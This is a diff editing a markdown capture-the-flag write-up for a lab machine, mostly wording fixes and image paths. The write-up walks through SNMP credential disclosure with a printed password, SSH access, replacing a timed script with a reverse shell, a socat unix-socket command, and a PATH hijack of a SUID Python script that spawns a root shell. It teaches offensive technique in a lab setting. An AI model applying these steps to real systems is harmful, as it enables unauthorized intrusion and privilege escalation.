@@ -10,7 +10,7 @@ You have been given the IP address of the target server and your mission is to g
 
 ## Enumeration
 
-Starting out the attacker interestingly see only port 22 is available. Due to this the attacker will check UDP.
+Starting out, the attacker identifies only port 22 is available. Due to this the attacker will check UDP.
 ```bash
 nmap -sV -T4 -p- 10.1.5.224                                  
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 10:00 EST
@@ -44,23 +44,22 @@ PORT    STATE         SERVICE
 ==161/udp open          snmp==
 ```
 
-With snmpwalk the attacker finds plaintext credentials:
+With [snmpwalk](https://linux.die.net/man/1/snmpwalk) the attacker finds plaintext credentials:
 `layne.stanley : 5t6^jahTRjab`
 
-![[snmpwalk.png]]
+![[writeups/hacksmarter/banksmarter (medium)/screenshots/snmpwalk.png]]
 
-With these credentials access to ssh is possible
-![[ssh.png]]
+With these credentials access to ssh is possible.
+![[writeups/hacksmarter/banksmarter (medium)/screenshots/ssh.png]]
 
-In the home directory there is a script owned by `scott.weiland`. Using pspy it's possible to see that the script is running on a timer. Since this script is in our user's home directory, the attacker can simply remove it and replace it with a reverse shell that will get executed.
-![[userscript.png]]
+In the home directory there is a script owned by `scott.weiland`. Using [pspy](https://github.com/DominicBreuker/pspy) it's possible to see that the script is running on a timer. Since this script is in our user's home directory, the attacker can simply remove it and replace it with a reverse shell that will get executed.
+![[writeups/hacksmarter/banksmarter (medium)/screenshots/userscript.png]]
 ![[writeups/hacksmarter/banksmarter (medium)/screenshots/pspy64.png]]
 
-Utilizing Penelope the reverse shell is caught.
-![[penelope.png]]
+Utilizing [Penelope](https://github.com/brightio/penelope) the reverse shell is caught.
+![[writeups/hacksmarter/banksmarter (medium)/screenshots/penelope.png]]
 
 Through standard enumeration the attacker identifies interesting attack vectors from `.bash_history`.
-
 ```bash
 <SNIP>
 socat stdio unix-connect:/opt/bank/sockets/live.sock
@@ -84,13 +83,13 @@ HISTFILE="/home/scott.weiland/.bash_history"
 ```
 
 Utilizing `socat stdio unix-connect:/opt/bank/sockets/live.sock` from above, it's possible to compromise `ronnie.stone`
-![[ronnie.png]]
+![[writeups/hacksmarter/banksmarter (medium)/screenshots/ronnie.png]]
 
 Enumerating for SUID binaries reveals:
-![[suid.png]]
+![[writeups/hacksmarter/banksmarter (medium)/screenshots/suid.png]]
 
 Which when run reveals a call to `bank_backup.py`
-![[suidrun.png]]
+![[writeups/hacksmarter/banksmarter (medium)/screenshots/suidrun.png]]
 
 Reading the source code reveals a critical weakness, The script is checking the current shell's environment with `#!/usr/bin/env python3`. This can be abused by specifying a path that gets loaded prior to the intentional one.
 ```bash
@@ -103,4 +102,5 @@ echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/python3
 chmod +x /tmp/python3
 ```
 
-![[root.png]]
+The scripts has been run and thus fully compromising the system.
+![[writeups/hacksmarter/banksmarter (medium)/screenshots/root.png]]
